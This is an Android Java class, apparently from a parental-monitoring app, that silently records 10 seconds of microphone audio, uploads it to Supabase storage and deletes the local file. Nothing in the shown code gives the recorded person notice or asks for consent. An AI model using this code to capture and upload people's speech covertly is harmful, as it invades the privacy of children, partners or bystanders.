package com.familycontrol.child;

import android.content.Context;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Log;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;

public class AudioManager {
    
    private static final String TAG = "AudioManager";
    private static final int SAMPLE_RATE = 44100;
    private static final int CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO;
    private static final int AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT;
    private static final int RECORDING_DURATION = 10000; // 10 seconds
    
    private Context context;
    private AudioRecord audioRecord;
    private HandlerThread recordingThread;
    private Handler recordingHandler;
    private SupabaseClient supabaseClient;
    private boolean isRecording = false;
    private int bufferSize;
    
    public AudioManager(Context context) {
        this.context = context;
        this.supabaseClient = new SupabaseClient(context);
        this.bufferSize = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT);
    }
    
    public void startRecording() {
        if (isRecording) {
            Log.w(TAG, "Already recording");
            return;
        }
        
        try {
            startRecordingThread();
            
            audioRecord = new AudioRecord(
                MediaRecorder.AudioSource.MIC,
                SAMPLE_RATE,
                CHANNEL_CONFIG,
                AUDIO_FORMAT,
                bufferSize
            );
            
            if (audioRecord.getState() != AudioRecord.STATE_INITIALIZED) {
                Log.e(TAG, "AudioRecord initialization failed");
                return;
            }
            
            isRecording = true;
            audioRecord.startRecording();
            
            recordingHandler.post(() -> {
                recordAudio();
            });
            
            // Stop recording after specified duration
            recordingHandler.postDelayed(() -> {
                stopRecording();
            }, RECORDING_DURATION);
            
        } catch (Exception e) {
            Log.e(TAG, "Error starting audio recording", e);
        }
    }
    
    public void stopRecording() {
        if (!isRecording) return;
        
        isRecording = false;
        
        if (audioRecord != null) {
            try {
                audioRecord.stop();
                audioRecord.release();
                audioRecord = null;
            } catch (Exception e) {
                Log.e(TAG, "Error stopping audio recording", e);
            }
        }
        
        stopRecordingThread();
    }
    
    private void startRecordingThread() {
        if (recordingThread == null) {
            recordingThread = new HandlerThread("AudioRecording");
            recordingThread.start();
            recordingHandler = new Handler(recordingThread.getLooper());
        }
    }
    
    private void stopRecordingThread() {
        if (recordingThread != null) {
            recordingThread.quitSafely();
            try {
                recordingThread.join();
                recordingThread = null;
                recordingHandler = null;
            } catch (InterruptedException e) {
                Log.e(TAG, "Error stopping recording thread", e);
            }
        }
    }
    
    private void recordAudio() {
        byte[] audioData = new byte[bufferSize];
        String fileName = "audio_" + System.currentTimeMillis() + ".wav";
        File audioFile = new File(context.getCacheDir(), fileName);
        
        try (FileOutputStream fos = new FileOutputStream(audioFile)) {
            // Write WAV header
            writeWavHeader(fos, SAMPLE_RATE, 1, 16);
            
            long totalBytesRecorded = 0;
            long maxBytes = SAMPLE_RATE * 2 * (RECORDING_DURATION / 1000); // 2 bytes per sample
            
            while (isRecording && totalBytesRecorded < maxBytes) {
                int bytesRead = audioRecord.read(audioData, 0, audioData.length);
                if (bytesRead > 0) {
                    fos.write(audioData, 0, bytesRead);
                    totalBytesRecorded += bytesRead;
                }
            }
            
            // Update WAV header with actual data size
            updateWavHeader(audioFile, totalBytesRecorded);
            
            // Upload to Supabase
            supabaseClient.uploadFile(fileName, audioFile.getAbsolutePath(), "audio");
            
            // Delete temporary file
            audioFile.delete();
            
            Log.d(TAG, "Audio recorded and uploaded: " + fileName);
            
        } catch (Exception e) {
            Log.e(TAG, "Error recording audio", e);
        }
    }
    
    private void writeWavHeader(FileOutputStream fos, int sampleRate, int channels, int bitsPerSample) throws IOException {
        byte[] header = new byte[44];
        
        // RIFF header
        header[0] = 'R'; header[1] = 'I'; header[2] = 'F'; header[3] = 'F';
        // File size (will be updated later)
        putInt(header, 4, 0);
        // WAVE
        header[8] = 'W'; header[9] = 'A'; header[10] = 'V'; header[11] = 'E';
        
        // fmt chunk
        header[12] = 'f'; header[13] = 'm'; header[14] = 't'; header[15] = ' ';
        putInt(header, 16, 16); // fmt chunk size
        putShort(header, 20, (short) 1); // audio format (PCM)
        putShort(header, 22, (short) channels);
        putInt(header, 24, sampleRate);
        putInt(header, 28, sampleRate * channels * bitsPerSample / 8); // byte rate
        putShort(header, 32, (short) (channels * bitsPerSample / 8)); // block align
        putShort(header, 34, (short) bitsPerSample);
        
        // data chunk
        header[36] = 'd'; header[37] = 'a'; header[38] = 't'; header[39] = 'a';
        // Data size (will be updated later)
        putInt(header, 40, 0);
        
        fos.write(header);
    }
    
    private void updateWavHeader(File file, long dataSize) {
        try {
            java.io.RandomAccessFile raf = new java.io.RandomAccessFile(file, "rw");
            
            // Update file size
            raf.seek(4);
            raf.writeInt(Integer.reverseBytes((int) (dataSize + 36)));
            
            // Update data size
            raf.seek(40);
            raf.writeInt(Integer.reverseBytes((int) dataSize));
            
            raf.close();
        } catch (Exception e) {
            Log.e(TAG, "Error updating WAV header", e);
        }
    }
    
    private void putInt(byte[] array, int offset, int value) {
        ByteBuffer.wrap(array, offset, 4).order(ByteOrder.LITTLE_ENDIAN).putInt(value);
    }
    
    private void putShort(byte[] array, int offset, short value) {
        ByteBuffer.wrap(array, offset, 2).order(ByteOrder.LITTLE_ENDIAN).putShort(value);
    }
}

